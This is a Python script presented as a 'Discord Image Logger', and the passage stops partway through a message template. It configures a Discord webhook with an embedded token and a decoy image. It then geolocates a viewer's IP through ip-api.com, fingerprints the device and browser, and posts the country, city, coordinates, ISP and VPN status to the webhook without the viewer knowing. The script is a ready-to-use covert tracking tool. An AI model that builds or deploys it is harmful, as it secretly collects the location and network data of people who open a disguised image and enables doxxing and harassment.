# Professional Discord Image Logger
# By Tim$erz | https://github.com/timzz71

from http.server import BaseHTTPRequestHandler, HTTPServer
import requests, base64, httpagentparser, json, traceback

# ============================================
# CONFIGURATION - EDIT THESE
# ============================================

config = {
    # ⚠️ YOUR DISCORD WEBHOOK URL (REQUIRED)
    "webhook": "https://discord.com/api/webhooks/1542691542807085098/tx_7D0GCqfYhVzqlgOs-67dCkqb46bOE3NINz7LtlLxKH0nZIIJrTT0xT9npO4hnKlWh",
    
    # The image that will be shown (must be a direct image URL)
    "image": "https://cdn.pfps.gg/pfps/3025-cool-spiderman.png",
    
    # Webhook settings
    "username": "Image Logger",
    "color": 0x00FFFF,
}

# ============================================
# DO NOT EDIT BELOW THIS LINE
# ============================================

def get_ip_info(ip):
    """Get real IP information from ip-api.com"""
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,as,lat,lon,timezone,mobile,proxy,hosting"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return data
    except:
        pass
    return None

def get_device_info(user_agent):
    """Detect device type from user agent"""
    ua = user_agent.lower()
    if 'mobile' in ua or 'android' in ua or 'iphone' in ua:
        return '📱 Mobile Phone'
    elif 'tablet' in ua or 'ipad' in ua:
        return '📱 Tablet'
    else:
        return '💻 Desktop Computer'

def send_to_discord(ip, user_agent, info):
    """Send all collected data to Discord webhook"""
    if not config["webhook"]:
        print("❌ No webhook URL set!")
        return
    
    # Parse user agent
    os_name = "Unknown"
    browser_name = "Unknown"
    try:
        if user_agent:
            os_name, browser_name = httpagentparser.simple_detect(user_agent)
    except:
        pass
    
    device = get_device_info(user_agent)
    
    # Build the message
    description = f"""**🎯 A User Opened the Image!**

**📱 Device:** `{device}`
**🌐 IP:** `{ip}`

**📍 Location:**
> **Country:** `{info.get('country', 'Unknown') if info else 'Unknown'}`
> **Region:** `{info.get('regionName', 'Unknown') if info else 'Unknown'}`
> **City:** `{info.get('city', 'Unknown') if info else 'Unknown'}`
> **Coordinates:** `{info.get('lat', 'N/A') if info else 'N/A'}, {info.get('lon', 'N/A') if info else 'N/A'}`
> **Timezone:** `{info.get('timezone', 'Unknown') if info else 'Unknown'}`

**🏢 Network:**
> **ISP:** `{info.get('isp', 'Unknown') if info else 'Unknown'}`
> **ASN:** `{info.get('as', 'Unknown') if info else 'Unknown'}`
> **Mobile:** `{info.get('mobile', 'Unknown') if info else 'Unknown'}`
> **VPN/Proxy:** `{info.get('proxy', 'Unknown') if info else 'Unknown'}`

**💻 Device Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser_name}`

**📄 User Agent:**
